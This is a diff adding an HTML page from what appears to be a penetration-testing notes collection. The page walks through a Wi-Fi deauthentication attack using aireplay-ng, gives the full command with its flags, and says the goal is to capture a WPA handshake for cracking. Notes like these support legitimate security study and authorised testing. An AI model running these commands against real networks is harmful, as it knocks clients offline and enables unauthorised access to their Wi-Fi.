@@ -1,0 +1,12 @@
+<!doctype html>
+<html>
+<head>
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  <title>2. Perform dauth attack</title>
+  <meta name="generator" content="CherryTree">
+  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
+</head>
+<body>
+<div class='page'><h1 class='title'>2. Perform dauth attack</h1><br/><br /><strong>Dauth attack</strong><br />1. Open a new window<br />2.  perfrom this command until we do not see compare “<span style="color:#ff8700;">WPA handshake [AP_MAC_Address]</span>” in the previous window<br /><div class="codebox"><div class="codebox">aireplay-ng&nbsp;-0&nbsp;1&nbsp;-a&nbsp;[AccessPoint_MAC_Address]&nbsp;-c&nbsp;[STATION_MAC_address]&nbsp;wlan0mon</div></div><br />    -0 → dauth attack<br />    1 → means that we want to run this attack/command only one time<br />    -a [BSSID] → BSSID is the MAC address of the Access Point/Router<br />    -c [STATION] → STATION is the client that we are attacking<br />    <a href=""><img src="images/1834-1.png" alt="images/1834-1.png" /></a><br /><br /><br />If WPA handshake appear in the captured data that we have done at point “<a href="Home--Penetration_Test_Methodology--Wi-Fi--Dauth_Attack--1._Select_Network_and_capture_data.html">1. Select Network and capture data</a>”, it means that we have captured the handshake and we can crack it!<br />    <a href=""><img src="images/1834-2.png" alt="images/1834-2.png" /></a></div>
+</body>
+</html>
